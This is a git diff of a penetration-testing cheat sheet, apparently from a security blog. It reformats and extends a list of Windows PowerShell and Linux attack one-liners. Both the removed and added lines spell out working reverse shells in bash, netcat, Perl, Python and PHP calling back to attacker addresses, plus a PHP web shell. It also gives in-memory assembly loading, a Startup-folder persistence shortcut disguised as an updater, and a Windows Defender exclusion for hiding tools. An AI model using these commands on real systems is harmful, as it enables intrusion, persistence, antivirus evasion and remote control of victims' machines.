@@ -37,71 +37,77 @@ author_profile: true
   - [Wireless](#wireless)
   - [Tools](#tools)
 
-## Powershell
+## Powershell/AD
 ### One liner run command as another user
-```
-$secpasswd = ConvertTo-SecureString "xxxxx" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential("DOMAIN\USER", $secpasswd); Invoke-Command -ComputerName re -Credential $creds -ScriptBlock {c:\path\to\cmd.exe 10.10.10.1 9003 -e cmd}
-```
+
+> ```$secpasswd = ConvertTo-SecureString "xxxxx" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential("DOMAIN\USER", $secpasswd); Invoke-Command -ComputerName re -Credential $creds -ScriptBlock {c:\path\to\cmd.exe 10.10.10.1 9003 -e cmd}```
+
 ### One liner to execute base64 encoded assembly
-```
-[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(<base64-str-here>)).EntryPoint.Invoke($null,@(,([string[]](""))))
-```
+
+> ```[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(<base64-str-here>)).EntryPoint.Invoke($null,@(,([string[]](""))))```
+  
 ### Run arbitrary assembly
-```
-$as.EntryPoint.Invoke($null, @(,[string[]]("arg1", "arg2", "etc")))
-```
+
+> ```$as.EntryPoint.Invoke($null, @(,[string[]]("arg1", "arg2", "etc")))```
+
 ### Download file
-```
-iwr -Uri <url> -OutFile <name>
-```
+
+> ```iwr -Uri <url> -OutFile <name>```
+
 ### Powershell-friendly base64 from Linux
-```
-echo -n '<text>' | iconv -f UTF8 -t UTF16LE | base64
-```
+
+> ```echo -n '<text>' | iconv -f UTF8 -t UTF16LE | base64```
+
 ### Base64 encode file
-```
-[Convert]::ToBase64String([IO.File]::ReadAllBytes(<file-path>))
-```
+
+> ```[Convert]::ToBase64String([IO.File]::ReadAllBytes(<file-path>))```
+
 ### Create a shortcut lnk one-liner
-```
-$Shortcut = (New-Object -comObject WScript.Shell).CreateShortcut("C:\users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk"); $Shortcut.TargetPath = "C:\users\<user>\AppData\updater2.exe";$Shortcut.Save()
-```
+
+> ```$Shortcut = (New-Object -comObject WScript.Shell).CreateShortcut("C:\users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk"); $Shortcut.TargetPath = "C:\users\<user>\AppData\updater2.exe";$Shortcut.Save()```
+
 ### Create a Windows Defender exclusion
-```
-Add-MpPreference -ExclusionPath "C:\users\lolcats\AppData\mysketchdir"
-```
+
+> ```Add-MpPreference -ExclusionPath "C:\users\lolcats\AppData\mysketchdir"```
+
+### Get computers in AD without AD cmdlets
+
+> ```([adsi]"WinNT://$((Get-WMIObject Win32_ComputerSystem).Domain)").Children | Where-Object {$_.schemaclassname -eq 'computer'}```
+
+
 ## Shells
 ### Upgrade to PTY
 Python
-```
-python -c 'import pty;pty.spawn("/bin/bash");'
-```
+
+> ```python -c 'import pty;pty.spawn("/bin/bash");'```
+
 Python 3
-```
-python3 -c 'import pty;pty.spawn("/bin/bash");'
-```
+
+> ```python3 -c 'import pty;pty.spawn("/bin/bash");'```
+
+
 ### Bash
 Regular
-```
-bash -i >& /dev/tcp/10.0.0.1/8888 0>&1
-```
+
+> ```bash -i >& /dev/tcp/10.0.0.1/8888 0>&1```
+
 Background process
-```
-bash -c '(bash -i >& /dev/tcp/10.0.0.1/8888 0>&1)&'
-```
+
+> ```bash -c '(bash -i >& /dev/tcp/10.0.0.1/8888 0>&1)&'```
+
 ### nc no e
-```
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444
-```
+
+> ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444```
+
 ### Perl
-```
-perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-```
+
+> ```perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```
+
 ### Python
 One Liner
-```
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-```
+
+> ```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```
+
 In a script  
 
 ```
@@ -118,13 +124,11 @@ p = subprocess.call(["/bin/sh","-i"])
 ```
 ### PHP
 Webshell
-```
-<?php echo system($_GET['cmd']); ?>
-```
+> ```<?php echo system($_GET['cmd']); ?>```
+
 Bash reverse shell
-```
-<?php system(bash -c '(bash -i >& /dev/tcp/10.0.0.1/8888 0>&1)&'); ?>
-```
+
+> ```<?php system(bash -c '(bash -i >& /dev/tcp/10.0.0.1/8888 0>&1)&'); ?>```
 
 ### Sites/Cheat sheets
 #### PayloadsAllTheThings
